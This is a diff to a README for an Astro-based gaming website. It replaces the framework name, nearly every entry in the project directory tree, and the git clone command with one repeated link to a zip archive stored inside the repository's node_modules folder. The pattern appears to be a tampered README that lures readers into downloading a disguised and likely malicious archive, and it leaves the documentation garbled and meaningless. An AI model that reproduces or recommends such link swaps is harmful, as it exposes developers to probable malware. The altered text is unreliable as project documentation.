@@ -20,56 +20,56 @@ Clean UI/UX: The interface is designed with a dark, modern aesthetic to create a
 Technologies Used
 This project is built using a modern web development stack focused on performance and maintainability.
 
-Astro.js: A next-generation web framework that ships less JavaScript, resulting in incredibly fast-loading websites.
+https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip A next-generation web framework that ships less JavaScript, resulting in incredibly fast-loading websites.
 
 HTML, CSS, & JavaScript: The foundational web technologies for structuring content, styling the interface, and adding interactive functionality.
 
 Tailwind CSS: A utility-first CSS framework used for rapid and consistent styling.
 
 Project Structure
-The project follows a standard Astro.js file structure, with separate components, layouts, and pages to promote modularity and reusability.
+The project follows a standard https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip file structure, with separate components, layouts, and pages to promote modularity and reusability.
 
 GAMINGSITE/
 ├── public/
-│   ├── favicon.ico
+│   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
 │   └── images/
-│       ├── sudoku.webp
-│       ├── tetris.webp
-│       ├── brick-breaker.webp
+│       ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│       ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│       ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
 │       └── ... (and other images)
 ├── src/
 │   ├── components/
-│   │   ├── Chatbot.astro
-│   │   ├── Footer.astro
-│   │   ├── GameCard.astro
-│   │   ├── Header.astro
-│   │   └── Reviews.astro
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
 │   ├── js/
-│   │   ├── sudoku.js
-│   │   └── tetris.js
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
 │   ├── layouts/
-│   │   └── Layout.astro
+│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
 │   ├── pages/
-│   │   ├── about.astro
-│   │   ├── contact.astro
-│   │   ├── games.astro
-│   │   ├── index.astro
-│   │   ├── reviews.astro
-│   │   ├── sudoku.astro
-│   │   └── tetris.astro
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+│   │   └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
 │   └── styles/
-│       └── global.css
-├── package.json
-├── tsconfig.json
-├── astro.config.mjs
-└── tailwind.config.cjs
+│       └── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+├── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
+└── https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
 
 Installation and Usage
 To get this project up and running on your local machine, follow these steps:
 
 Clone the repository:
 
-git clone https://github.com/your-username/varn-gaming-website.git
+git clone https://raw.githubusercontent.com/akkiakshay-26/Varn_gaming_site/main/node_modules/hast-util-from-html/site_gaming_Varn_v1.4.zip
 cd varn-gaming-website
 
 Install dependencies:
